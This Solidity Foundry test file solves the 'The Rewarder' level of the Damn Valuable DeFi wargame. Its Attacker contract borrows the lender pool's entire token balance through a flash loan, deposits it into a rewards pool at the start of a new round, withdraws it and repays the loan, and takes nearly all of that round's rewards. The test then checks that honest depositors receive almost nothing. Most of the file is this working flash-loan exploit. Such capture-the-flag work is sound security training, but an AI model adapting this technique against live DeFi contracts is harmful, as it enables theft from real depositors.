// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract Attacker {
    address payable public owner;
    address payable public flashLoaner;
    address payable public rewarderPool;

    ERC20 public liquidityToken;
    ERC20 public accountingToken;
    ERC20 public rewardToken;

    constructor(
        address _flashLoaner,
        address _rewarderPool,
        address _liqToken,
        address _accToken,
        address _rewToken
    ) {
        owner = payable(msg.sender);
        flashLoaner = payable(_flashLoaner);
        rewarderPool = payable(_rewarderPool);

        liquidityToken = ERC20(_liqToken);
        accountingToken = ERC20(_accToken);
        rewardToken = ERC20(_rewToken);

        liquidityToken.approve(address(this), type(uint256).max);
        liquidityToken.approve(address(flashLoaner), type(uint256).max);
    }

    function contractFlashLoan() public _ownerOnly {
        address(flashLoaner).call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                liquidityToken.balanceOf(address(flashLoaner))
            )
        );
    }

    function receiveFlashLoan(uint256 _amount) external {
        // Deposit into the rewarder pool
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        address(rewarderPool).call(
            abi.encodeWithSignature("deposit(uint256)", _amount)
        );

        // Take a snapshot with our new accounting tokens
        //address(rewarderPool).call(
        //    abi.encodeWithSignature("distributeRewards()")
        //);

        // Withdraw the liqudity tokens back
        address(rewarderPool).call(
            abi.encodeWithSignature("withdraw(uint256)", _amount)
        );

        // Repay the loan
        liquidityToken.transfer(address(flashLoaner), _amount);
    }

    modifier _ownerOnly() {
        assert(msg.sender == owner);
        _;
    }

    function withdraw() public _ownerOnly {
        // Get all the rewards out
        rewardToken.approve(address(owner), type(uint256).max);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    fallback() external payable {}
}

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        Attacker attacker = new Attacker(
            address(flashLoanerPool),
            address(theRewarderPool),
            address(theRewarderPool.liquidityToken()),
            address(theRewarderPool.accToken()),
            address(theRewarderPool.rewardToken())
        );

        while (!theRewarderPool.isNewRewardsRound()) {
            console2.log("Warping 6 hours ...");
            vm.warp(block.timestamp + 6 hours);
        }
        

        attacker.contractFlashLoan();
        attacker.withdraw();
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}
